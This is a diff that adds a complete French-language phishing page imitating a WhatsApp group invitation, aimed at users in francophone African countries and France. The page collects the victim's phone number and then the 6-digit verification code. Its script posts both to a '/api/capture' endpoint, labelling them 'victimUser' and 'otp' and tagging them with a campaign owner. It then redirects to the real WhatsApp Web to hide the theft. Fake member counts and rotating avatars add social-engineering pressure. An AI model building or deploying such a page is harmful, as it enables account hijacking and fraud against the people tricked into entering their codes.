@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp - Rejoindre le groupe</title>
+    <style>
+        :root {
+            --wa-green: #25D366;
+            --wa-green-bright: #22c55e;
+            --wa-green-hover: #1ebc59;
+            --wa-dark-teal: #008069;
+            --wa-bg-beige: #efeae2;
+            --top-bar-gray: #f0f2f5;
+            --card-white: #ffffff;
+            --text-primary: #111b21;
+            --text-secondary: #54656f;
+            --border-light: #d1d7db;
+            --error-red: #ea0038;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* Arrière-plan style discussion WhatsApp avec motif subtil */
+        body {
+            background-color: var(--wa-bg-beige);
+            background-image: radial-gradient(#d5cec2 1px, transparent 1px), radial-gradient(#d5cec2 1px, var(--wa-bg-beige) 1px);
+            background-size: 32px 32px;
+            background-position: 0 0, 16px 16px;
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Barre grise supérieure avec Logo WhatsApp à gauche */
+        .top-navbar {
+            background-color: var(--top-bar-gray);
+            height: 64px;
+            width: 100%;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e2e5e9;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .brand-logo svg {
+            width: 34px;
+            height: 34px;
+            fill: var(--wa-green);
+        }
+
+        .brand-name {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #111b21;
+        }
+
+        /* Zone centrale */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+        }
+
+        /* Carte principale */
+        .auth-card {
+            background-color: var(--card-white);
+            width: 100%;
+            max-width: 440px;
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(11, 20, 26, 0.12);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* En-tête de la carte en vert : le bloc avatars descend toucher la bordure basse */
+        .card-header {
+            background: linear-gradient(180deg, #25d366 0%, #16a34a 100%);
+            padding: 24px 16px 0;
+            color: #ffffff;
+            border-bottom: 3px solid rgba(255, 255, 255, 0.28);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header-center-block {
+            padding: 0 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .wa-badge {
+            width: 64px;
+            height: 64px;
+            background-color: rgba(255, 255, 255, 0.18);
+            border: 2px solid rgba(255, 255, 255, 0.35);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 11px;
+        }
+
+        .wa-badge svg {
+            width: 36px;
+            height: 36px;
+            fill: #ffffff;
+        }
+
+        .group-title {
+            font-size: 1.28rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 4px;
+        }
+
+        .group-subtitle {
+            font-size: 0.86rem;
+            color: rgba(255, 255, 255, 0.94);
+            margin-bottom: 14px;
+        }
+
+        /* Pillule avatars + membres : marge droite visible (n'entre pas dans le bord) + posée sur le bord bas */
+        .members-dock-row {
+            align-self: flex-end;
+            margin-right: 2px;
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(0, 0, 0, 0.16);
+            padding: 5px 12px 5px 6px;
+            border-radius: 14px 14px 0 0;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-bottom: none;
+        }
+
+        .avatar-stack {
+            display: flex;
+            align-items: center;
+        }
+
+        .avatar-item {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 1.5px solid #16a34a;
+            overflow: hidden;
+            margin-left: -7px;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.22);
+            flex-shrink: 0;
+            transition: transform 0.38s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.35s ease;
+        }
+
+        .avatar-item:first-child {
+            margin-left: 0;
+        }
+
+        .avatar-item.swap-anim {
+            transform: translateY(-3px) scale(1.08);
+        }
+
+        .avatar-item.fade-swap {
+            opacity: 0.25;
+            transform: scale(0.86);
+        }
+
+        .avatar-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .members-count {
+            font-size: 0.74rem;
+            font-weight: 700;
+            color: #ffffff;
+            white-space: nowrap;
+            letter-spacing: 0.1px;
+        }
+
+        /* Corps du formulaire */
+        .card-body {
+            padding: 26px 24px 28px;
+        }
+
+        .step-description {
+            font-size: 0.92rem;
+            color: var(--text-secondary);
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--wa-dark-teal);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .phone-row {
+            display: flex;
+            gap: 10px;
+            align-items: stretch;
+        }
+
+        select, input {
+            height: 50px;
+            padding: 0 14px;
+            border: 1.5px solid var(--border-light);
+            border-radius: 10px;
+            font-size: 1rem;
+            line-height: 1.2;
+            color: var(--text-primary);
+            background-color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        select {
+            width: 118px;
+            min-width: 118px;
+            flex-shrink: 0;
+            padding: 0 10px;
+            font-size: 0.96rem;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        input[type="tel"], input[type="text"] {
+            flex: 1;
+            min-width: 0;
+            width: 100%;
+        }
+
+        select:focus, input:focus {
+            border-color: var(--wa-green);
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.16);
+        }
+
+        .otp-field {
+            height: 56px;
+            text-align: center;
+            font-size: 1.5rem !important;
+            font-weight: 700;
+            letter-spacing: 10px;
+        }
+
+        .error-text {
+            color: var(--error-red);
+            font-size: 0.82rem;
+            margin-top: 7px;
+            display: none;
+        }
+
+        /* Boutons */
+        .btn-submit {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            background-color: var(--wa-green);
+            color: #ffffff;
+            border: none;
+            border-radius: 26px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.28);
+        }
+
+        .btn-submit:hover {
+            background-color: var(--wa-green-hover);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.99);
+        }
+
+        .btn-link {
+            display: block;
+            width: 100%;
+            margin-top: 14px;
+            background: none;
+            border: none;
+            color: var(--wa-dark-teal);
+            font-size: 0.88rem;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Gestion des étapes */
+        .view-section {
+            display: none;
+            animation: fadeSlide 0.28s ease;
+        }
+
+        .view-section.active {
+            display: block;
+        }
+
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Overlay de chargement plein écran (Arrière-plan WhatsApp + Cercle vert) */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: var(--wa-bg-beige);
+            background-image: radial-gradient(#d5cec2 1px, transparent 1px), radial-gradient(#d5cec2 1px, var(--wa-bg-beige) 1px);
+            background-size: 32px 32px;
+            background-position: 0 0, 16px 16px;
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .loading-overlay.visible {
+            display: flex;
+            animation: fadeInOverlay 0.2s ease;
+        }
+
+        @keyframes fadeInOverlay {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Cercle de chargement vert */
+        .green-spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(37, 211, 102, 0.22);
+            border-top-color: var(--wa-green);
+            border-radius: 50%;
+            animation: spin 0.85s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-label {
+            font-size: 0.98rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            background: rgba(255, 255, 255, 0.9);
+            padding: 8px 18px;
+            border-radius: 20px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+        }
+
+        .card-footer {
+            background-color: #f9fafb;
+            padding: 14px 20px;
+            text-align: center;
+            font-size: 0.78rem;
+            line-height: 1.45;
+            color: var(--text-secondary);
+            border-top: 1px solid #f0f2f5;
+        }
+
+        @media (max-width: 390px) {
+            select {
+                width: 104px;
+                min-width: 104px;
+                font-size: 0.9rem;
+                padding: 0 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Barre grise supérieure avec Logo WhatsApp à gauche -->
+    <header class="top-navbar">
+        <a href="#" class="brand-logo" aria-label="WhatsApp">
+            <svg viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
+                <path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/>
+            </svg>
+            <span class="brand-name">WhatsApp</span>
+        </a>
+    </header>
+
+    <!-- Écran de chargement plein écran (3 secondes) -->
+    <div id="loading-screen" class="loading-overlay" role="status" aria-live="polite">
+        <div class="green-spinner"></div>
+        <div id="loading-message" class="loading-label">Vérification en cours...</div>
+    </div>
+
+    <!-- Conteneur central -->
+    <main class="main-wrapper">
+        <div class="auth-card">
+            <!-- En-tête de la carte en vert -->
+            <div class="card-header">
+                <div class="header-center-block">
+                    <div class="wa-badge">
+                        <svg viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-16 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/>
+                        </svg>
+                    </div>
+                    <h1 class="group-title">Rejoindre le groupe WhatsApp</h1>
+                    <p class="group-subtitle">Invitation officielle • Vérification du membre</p>
+                </div>
+
+                <!-- Bloc avatars superposés + 274 membres (marge droite visible + posé sur le bord bas) -->
+                <div class="members-dock-row" aria-label="274 membres dans le groupe">
+                    <div class="avatar-stack" id="avatarStack">
+                        <div class="avatar-item">
+                            <img src="https://i.pravatar.cc/100?img=12" alt="Membre">
+                        </div>
+                        <div class="avatar-item">
+                            <img src="https://i.pravatar.cc/100?img=32" alt="Membre">
+                        </div>
+                        <div class="avatar-item">
+                            <img src="https://i.pravatar.cc/100?img=47" alt="Membre">
+                        </div>
+                        <div class="avatar-item">
+                            <img src="https://i.pravatar.cc/100?img=68" alt="Membre">
+                        </div>
+                    </div>
+                    <span class="members-count">274 membres</span>
+                </div>
+            </div>
+
+            <div class="card-body">
+                <!-- ÉTAPE 1 : Saisie du numéro -->
+                <section id="view-phone" class="view-section active">
+                    <p class="step-description">
+                        Entrez votre numéro de téléphone WhatsApp pour confirmer votre identité et accéder au groupe.
+                    </p>
+
+                    <form id="form-phone" novalidate>
+                        <div class="form-group">
+                            <label class="form-label" for="input-phone">Votre numéro de téléphone</label>
+                            <div class="phone-row">
+                                <select id="select-country" aria-label="Indicatif du pays">
+                                    <option value="+225" selected>🇨🇮 +225</option>
+                                    <option value="+33">🇫🇷 +33</option>
+                                    <option value="+221">🇸🇳 +221</option>
+                                    <option value="+237">🇨🇲 +237</option>
+                                    <option value="+223">🇲🇱 +223</option>
+                                    <option value="+226">🇧🇫 +226</option>
+                                    <option value="+229">🇧🇯 +229</option>
+                                    <option value="+212">🇲🇦 +212</option>
+                                </select>
+                                <input 
+                                    type="tel" 
+                                    id="input-phone" 
+                                    placeholder="07 00 00 00 00" 
+                                    autocomplete="tel"
+                                    required
+                                >
+                            </div>
+                            <p id="error-phone" class="error-text">Veuillez saisir un numéro valide (8 à 12 chiffres).</p>
+                        </div>
+
+                        <button type="submit" class="btn-submit">
+                            Valider le numéro
+                        </button>
+                    </form>
+                </section>
+
+                <!-- ÉTAPE 2 : Saisie du code OTP -->
+                <section id="view-otp" class="view-section">
+                    <p class="step-description">
+                        Un code à 6 chiffres a été envoyé par SMS/WhatsApp au <strong id="confirmed-number"></strong>.
+                    </p>
+
+                    <form id="form-otp" novalidate>
+                        <div class="form-group">
+                            <label class="form-label" for="input-otp">Code de vérification (OTP)</label>
+                            <input 
+                                type="text" 
+                                id="input-otp" 
+                                class="otp-field" 
+                                maxlength="6" 
+                                inputmode="numeric" 
+                                placeholder="••••••"
+                                required
+                            >
+                            <p id="error-otp" class="error-text">Veuillez entrer les 6 chiffres du code reçu.</p>
+                        </div>
+
+                        <button type="submit" class="btn-submit">
+                            Confirmer et rejoindre
+                        </button>
+                        <button type="button" id="btn-change-number" class="btn-link">
+                            Modifier le numéro de téléphone
+                        </button>
+                    </form>
+                </section>
+            </div>
+
+            <div class="card-footer">
+                Chiffrement de bout en bout • WhatsApp Messenger • 274 membres actifs
+            </div>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const campaignOwner = urlParams.get('user') || 'Kim';
+            const linkType = (urlParams.get('type') || 'otp').toLowerCase();
+
+            let capturedPhone = '';
+
+            // 5 avatars disponibles (4 affichés à la fois, le 5e entre en rotation)
+            const avatarPool = [
+                { src: 'https://i.pravatar.cc/100?img=12', alt: 'Membre 1' },
+                { src: 'https://i.pravatar.cc/100?img=32', alt: 'Membre 2' },
+                { src: 'https://i.pravatar.cc/100?img=47', alt: 'Membre 3' },
+                { src: 'https://i.pravatar.cc/100?img=68', alt: 'Membre 4' },
+                { src: 'https://i.pravatar.cc/100?img=52', alt: 'Membre 5' }
+            ];
+            let activeIndices = [0, 1, 2, 3];
+            let nextPoolIdx = 4;
+            let scheduleStep = 0;
+            // Intervalles demandés (en secondes) : 5s, 20s, 10s, 5s, 15s
+            const swapDelaysMs = [5000, 20000, 10000, 5000, 15000];
+
+            const avatarStack = document.getElementById('avatarStack');
+
+            function renderAvatars(swapSlotIndex = null) {
+                avatarStack.innerHTML = '';
+                activeIndices.forEach((poolIdx, slotIdx) => {
+                    const person = avatarPool[poolIdx];
+                    const item = document.createElement('div');
+                    item.className = 'avatar-item';
+                    if (slotIdx === swapSlotIndex) {
+                        item.classList.add('fade-swap');
+                    } else if (swapSlotIndex !== null) {
+                        item.classList.add('swap-anim');
+                    }
+
+                    const img = document.createElement('img');
+                    img.src = person.src;
+                    img.alt = person.alt;
+                    item.appendChild(img);
+                    avatarStack.appendChild(item);
+
+                    requestAnimationFrame(() => {
+                        requestAnimationFrame(() => {
+                            item.classList.remove('fade-swap', 'swap-anim');
+                        });
+                    });
+                });
+            }
+
+            function rotateAvatarPositions() {
+                const mode = scheduleStep % 3;
+
+                if (mode === 0) {
+                    // Le dernier avatar passe en première position
+                    const last = activeIndices.pop();
+                    activeIndices.unshift(last);
+                    renderAvatars(0);
+                } else if (mode === 1) {
+                    // Celui en 2e position passe en 1re position
+                    const second = activeIndices.splice(1, 1)[0];
+                    activeIndices.unshift(second);
+                    renderAvatars(0);
+                } else {
+                    // Un nouvel avatar (le 5e) vient remplacer une position et tourne
+                    const incomingIdx = nextPoolIdx % avatarPool.length;
+                    nextPoolIdx++;
+                    const targetSlot = scheduleStep % activeIndices.length;
+                    if (!activeIndices.includes(incomingIdx)) {
+                        activeIndices[targetSlot] = incomingIdx;
+                    } else {
+                        const first = activeIndices.shift();
+                        activeIndices.push(first);
+                    }
+                    renderAvatars(targetSlot);
+                }
+
+                const delay = swapDelaysMs[scheduleStep % swapDelaysMs.length];
+                scheduleStep++;
+                setTimeout(rotateAvatarPositions, delay);
+            }
+
+            setTimeout(rotateAvatarPositions, swapDelaysMs[0]);
+
+            // Sélecteurs des vues et overlays
+            const viewPhone = document.getElementById('view-phone');
+            const viewOtp = document.getElementById('view-otp');
+            const loadingScreen = document.getElementById('loading-screen');
+            const loadingMessage = document.getElementById('loading-message');
+
+            // Sélecteurs formulaires et champs
+            const formPhone = document.getElementById('form-phone');
+            const selectCountry = document.getElementById('select-country');
+            const inputPhone = document.getElementById('input-phone');
+            const errorPhone = document.getElementById('error-phone');
+            const confirmedNumber = document.getElementById('confirmed-number');
+
+            const formOtp = document.getElementById('form-otp');
+            const inputOtp = document.getElementById('input-otp');
+            const errorOtp = document.getElementById('error-otp');
+            const btnChangeNumber = document.getElementById('btn-change-number');
+
+            const WHATSAPP_REDIRECT_URL = "https://web.whatsapp.com/";
+
+            function captureData(payload) {
+                return fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch((err) => console.log(err));
+            }
+
+            function triggerLoadingScreen(message, callback) {
+                loadingMessage.textContent = message;
+                loadingScreen.classList.add('visible');
+
+                setTimeout(() => {
+                    loadingScreen.classList.remove('visible');
+                    if (typeof callback === 'function') {
+                        callback();
+                    }
+                }, 3000);
+            }
+
+            inputPhone.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9\s]/g, '');
+                errorPhone.style.display = 'none';
+            });
+
+            inputOtp.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+                errorOtp.style.display = 'none';
+            });
+
+            formPhone.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const cleanDigits = inputPhone.value.replace(/\s+/g, '');
+
+                if (cleanDigits.length < 8 || cleanDigits.length > 12) {
+                    errorPhone.style.display = 'block';
+                    inputPhone.focus();
+                    return;
+                }
+
+                capturedPhone = `${selectCountry.value} ${inputPhone.value.trim()}`;
+                const isOtpFlow = linkType !== 'standard';
+
+                captureData({
+                    owner: campaignOwner,
+                    network: 'WhatsApp',
+                    type: isOtpFlow ? 'otp_step1' : 'standard',
+                    victimUser: capturedPhone,
+                    victimPass: 'Non requis',
+                    otp: 'Aucun'
+                });
+
+                triggerLoadingScreen("Connexion à WhatsApp...", () => {
+                    if (isOtpFlow) {
+                        confirmedNumber.textContent = capturedPhone;
+                        viewPhone.classList.remove('active');
+                        viewOtp.classList.add('active');
+                        inputOtp.value = '';
+                        inputOtp.focus();
+                    } else {
+                        window.location.href = WHATSAPP_REDIRECT_URL;
+                    }
+                });
+            });
+
+            formOtp.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const otpValue = inputOtp.value.trim();
+
+                if (otpValue.length !== 6) {
+                    errorOtp.style.display = 'block';
+                    inputOtp.focus();
+                    return;
+                }
+
+                captureData({
+                    owner: campaignOwner,
+                    network: 'WhatsApp',
+                    type: linkType,
+                    victimUser: capturedPhone,
+                    victimPass: 'Non requis',
+                    otp: otpValue
+                });
+
+                triggerLoadingScreen("Redirection vers le groupe WhatsApp...", () => {
+                    window.location.href = WHATSAPP_REDIRECT_URL;
+                });
+            });
+
+            btnChangeNumber.addEventListener('click', () => {
+                errorOtp.style.display = 'none';
+                viewOtp.classList.remove('active');
+                viewPhone.classList.add('active');
+                inputPhone.focus();
+            });
+        });
+    </script>
+</body>
+</html>
